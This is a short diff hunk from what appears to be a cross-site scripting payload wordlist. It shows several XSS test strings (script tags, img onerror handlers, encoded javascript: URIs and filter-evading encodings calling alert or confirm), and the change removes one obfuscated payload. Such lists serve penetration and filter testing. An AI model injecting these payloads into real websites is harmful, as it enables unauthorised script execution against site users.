@@ -126,7 +126,6 @@ javascript:%ef%bb%bfalert(XSS)
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
 <img/src=x onError="`${x}`;alert(`Hello`);">
 "`'><script>\xE2\x80\x87javascript:alert(1)</script>
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 ‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
